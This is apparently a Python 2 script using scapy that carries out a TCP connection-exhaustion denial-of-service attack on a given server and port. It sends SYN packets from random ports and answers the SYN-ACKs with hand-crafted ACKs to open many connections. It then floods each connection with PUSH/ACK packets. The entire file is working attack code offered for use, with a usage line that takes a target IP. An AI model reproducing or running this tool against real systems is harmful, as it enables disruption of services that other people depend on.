import sys,time
from scapy.all import *
from random import randint
from threading import Thread

class Ack(Thread):
	def __init__(self,target,port,nbPacket):
        	self.t = target
        	self.p = int(port)
        	self.nb = int(nbPacket)
        	self.listePort = []
        	Thread.__init__(self)
    	def addPort(self,nb):
        	self.listePort.append(int(nb))
    	def run(self):
        	i = 0
        	time.sleep(10)
        	while i < self.nb:
            		for port in self.listePort:
                		send(IP(dst = self.t)/TCP(dport = self.p, sport = port, flags = 'PA'))
            		i = i + 1
		print str(i) + ' packets PUSH / ACK sent for each socket ! '

class Sniffer(Thread):
	def __init__(self,target,port,nbPack):
        	self.ACK = Ack(target,port,nbPack)
        	self.nbPack = nbPack
		if nbPack != 0:
			self.ACK.start()
		Thread.__init__(self)
		self.t = target
		self.p = port
		self.sniff = 1
		self.nbSock = 0
	def stop(self):
		self.sniff = 0
	def run(self):
		while self.sniff:
			a = sniff(count = 1)[0]
			
			try:
				if a[TCP].flags == 18 and a[TCP].sport == self.p and a[IP].src == self.t:
					numSeq = a[TCP].ack
					numAck = a[TCP].seq + 1
					send(IP(dst = self.t)/TCP(dport = self.p,sport = a[TCP].dport, flags = 'A',seq = numSeq,ack = numAck))
					print 'packet TCP ACK'
					self.nbSock = self.nbSock + 1 
					if self.nbPack != 0:
						self.ACK.addPort(a[TCP].dport)
			except:
				pass
		print str(self.nbSock) + ' max connection established ! '
		
if __name__ == '__main__':
	if len(sys.argv) < 5:
		print 'Syntax !/.py ip_serveur port nbPaquetsSyn nbPaquets_par_socket'
		exit(0)
	s = sys.argv[1]
	p = int(sys.argv[2])
	nbS = int(sys.argv[3])
	nb = int(sys.argv[4])
	a = Sniffer(s,p,nb)
	a.start()
	i = 0
	while i < nbS:
		send(IP(dst = s)/TCP(sport = randint(1,65535),dport = p,flags = 'S'))
		i = i + 1
	a.stop()
